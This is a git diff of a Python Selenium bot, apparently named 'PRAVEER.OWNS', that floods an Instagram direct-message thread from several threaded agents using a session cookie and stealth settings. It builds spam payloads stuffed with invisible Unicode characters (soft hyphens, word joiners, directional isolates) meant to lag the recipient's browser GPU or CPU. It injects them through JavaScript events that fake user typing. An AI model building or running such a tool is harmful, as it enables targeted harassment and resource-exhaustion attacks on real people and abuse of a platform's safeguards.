@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (COMPOSITOR-KILL V46)
-# 📅 STATUS: HARDWARE-ACCELERATION-LOCK | 4-AGENT TOTAL | AWS-GPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (BYPASS-V47)
+# 📅 STATUS: ZERO-LAG-SENDING | 4-AGENT TOTAL | AWS-CPU-STRIKE
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,30 +12,29 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.15)  
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 3          
+BURST_SPEED = (0.2, 0.4)    # 🛡️ Tuned for maximum server stability
+REST_AFTER_STRIKES = 100   
+REST_DURATION = 5          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_compositor_kill_payload():
-    """Generates a payload that forces GPU 'Layer-Thrashing'."""
+def get_bypass_payload():
+    """Generates a visible, high-impact block that bypasses local rendering lag."""
     u_id = random.randint(100, 999)
-    # \u2060 = Word Joiner | \u200D = ZWJ | \u00AD = Soft Hyphen
-    # Soft hyphens force the browser to speculate on thousands of potential line breaks.
-    glue, zwj, shy = "\u2060", "\u200D", "\u00AD"
+    # \u2060 = Word Joiner (Invisible glue)
+    # \u2068 = Directional Isolate (Forces CPU recalculation)
+    glue, iso, pop = "\u2060", "\u2068", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HARDWARE_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [ATOMIC_LOCK:{u_id}]"
     
     body = []
-    # 420 lines - Maximizing the 'Scroll-Back' memory buffer
-    for i in range(420):
-        # We mix standard text with invisible 'Soft Hyphens'.
-        # This tells the opponent's browser: "This line could break at 50 different spots."
-        # The GPU has to keep all 50 possibilities in VRAM.
-        line = f"PRAVEER{shy}PAPA{shy}ON{shy}TOP{shy}🌙{zwj}{i}{glue*12}"
+    # 350 lines - Optimized for high-speed transmission
+    for i in range(350):
+        # We sandwich the branding between invisible directional shifts
+        # This keeps the text visible but makes the 'Logic' of the line heavy
+        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9995]
@@ -46,10 +45,9 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # Optimization: We disable our own rendering so we never lag
+        # 🛡️ CRITICAL: Disable all visual rendering for YOUR bot to prevent lag
         chrome_options.add_argument("--disable-gpu")
-        chrome_options.add_argument("--proxy-server='direct://'")
-        chrome_options.add_argument("--proxy-bypass-list=*")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -58,15 +56,26 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_send(driver, text):
-    """Bypasses local UI bottlenecks entirely."""
+def bypass_send(driver, text):
+    """Bypasses the 'Typing' hang by force-triggering the socket event."""
     try:
+        # This script 'Nukes' the input box and fires the ENTER event immediately
+        # It uses the Native DOM 'Input' event to trick Instagram into thinking the user typed instantly.
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
+                // 1. Clear current state
+                document.execCommand('selectAll', false, null);
+                document.execCommand('delete', false, null);
+                // 2. Inject payload
                 document.execCommand('insertText', false, arguments[0]);
-                var e = new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true});
+                // 3. Trigger React/Angular internal state update
+                box.dispatchEvent(new Event('input', { bubbles: true }));
+                // 4. Force Enter key event
+                var e = new KeyboardEvent('keydown', {
+                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true, cancelable: true
+                });
                 box.dispatchEvent(e);
             }
         """, text)
@@ -80,26 +89,28 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) # Wait for DOM to stabilize
             
             strike_count = 0
             while True:
-                payload = get_compositor_kill_payload()
-                if atomic_send(driver, payload):
+                payload = get_bypass_payload()
+                if bypass_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Hardware-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Atomic Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 70 == 0:
+                    if strike_count % 50 == 0:
+                        # Reset memory before local lag kicks in
                         driver.refresh()
-                        time.sleep(6)
+                        time.sleep(8)
+                
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(3)
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
